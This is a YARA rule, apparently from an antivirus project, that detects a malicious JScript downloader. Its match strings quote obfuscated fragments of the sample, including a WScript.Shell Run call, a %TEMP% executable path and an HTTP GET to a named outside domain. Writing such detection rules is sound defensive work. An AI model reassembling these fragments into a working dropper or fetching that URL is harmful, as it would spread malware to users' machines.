rule sig_20160328_a0f2ab1c250684f0c6bb82ad5e3ecfb8 {
  meta:
    description = "datamaliciousorder - file 20160328_a0f2ab1c250684f0c6bb82ad5e3ecfb8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "18d6a3cbc2559dd5881253ae92338430e81784db60254228f9542ca868ca7edd"

  strings:
    $s1  = "function Ajdaz() {return Pmnzczstr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"hcGVNGgGkQNkIE.exe\";};" fullword ascii
    $s2  = "Lavyni[Wbybcc](\"GET\", \"http://princesse-hippie.com/m6yaf\", false);" fullword ascii
    $s3  = "do {WScript[Nudnlgunhl](Xkakvumsw() * 11)} while (Lavyni[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Dkfqxs(Ixgepvz, Qqhrfwc){return Ixgepvz - Qqhrfwc;};" fullword ascii
    $s5  = "var Pmnzczstr = function Hocqe() {return WScript[Jnqsacluk](\"WScript.Shell\");}();" fullword ascii
    $s6  = " while (Nfzspyzmkm){" fullword ascii
    $s7  = "function Jdgboam() {return ((Dhdjuz == true) && (Dhdjuz == Fsssz)) ? 1 : Fjbhhhps;};" fullword ascii
    $s8  = "function Rzvtrvuhj(Lufvsrec){Pmnzczstr[\"Run\"](Lufvsrec, Fjbhhhps, Fjbhhhps);};" fullword ascii
    $s9  = "} catch(Nhbqotjt){Nfzspyzmkm = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii
    $s10 = "var Dhdjuz = false;" fullword ascii
    $s11 = "var Fsssz = false;" fullword ascii
    $s12 = "function Ysqoti()" fullword ascii
    $s13 = "return Dkfqxs(Jcunuqbkv, Ucqwkoelsb);" fullword ascii
    $s14 = "function Mskssr(Ynzfunxmpv) {var Llpdl = (1, 2, 3, 4, 5, Ynzfunxmpv); return Llpdl;};" fullword ascii
    $s15 = "var Errftiuxy = false;" fullword ascii
    $s16 = "var Ytklciae = new this[\"Date\"]();" fullword ascii
    $s17 = "function Xkakvumsw(){return 22;};" fullword ascii
    $s18 = "Fsssz = true; " fullword ascii
    $s19 = "function Denhkdjcg(){return Lglvsrolww;};" fullword ascii
    $s20 = "Dhdjuz = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}